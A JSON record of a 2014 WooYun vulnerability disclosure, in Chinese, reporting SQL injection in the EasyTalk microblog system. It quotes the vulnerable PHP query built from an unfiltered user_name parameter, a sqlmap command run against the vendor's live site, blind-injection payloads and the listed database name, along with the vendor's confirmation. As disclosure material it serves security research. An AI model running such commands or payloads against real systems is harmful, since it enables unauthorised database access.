{"id": 58555, "wybug_id": "wooyun-2014-050787", "wybug_title": "EasyTalk开源微博系统SQL注入", "wybug_corp": "nextsns.com", "wybug_author": "秋风", "wybug_date": "2014-02-12 22:01", "wybug_open_date": "2014-05-13 22:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-13：\t细节向公众公开  简要描述： 搞开发的，把产品自身安全做好才是王道，而不是借助某些所谓的安全产品来帮助防御！ 详细说明：  Location: Home/Lib/Action/SpaceAction.class.php代码片段\n//profile 获得用户public function getuser() {\tif ($this->my['user_name']==$_GET['user_name']) {\t\t$user=$this->my;\t} else {\t\t//$_GET[user_name]参数未过滤，这里的$_GET[user_name]，就是url上的t.nextsns.com/?user_name\t\t$user=$this->uModel->where(\"user_name='$_GET[user_name]'\")->find(); \t}\treturn $user;}\n虽然内置了某数字的防御系统，但还是能注出数据！\npython sqlmap.py -u \"http://t.nextsns.com/?fate666888*\" --batch --dbs --flush-sessionURI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Nsqlmap identified the following injection points with a total of 375 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://t.nextsns.com:80/?fate666888' AND 7549=7549 AND 'etdJ'='etdJ    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: http://t.nextsns.com:80/?fate666888' AND SLEEP(5) AND 'vvIC'='vvIC---back-end DBMS: MySQL 5.0.11available databases [1]:[*] etnew\n   漏洞证明：  \n\n   修复方案：  有效过滤！   版权声明：转载请注明来源 秋风@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-02-12 22:47 厂商回复： 以修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}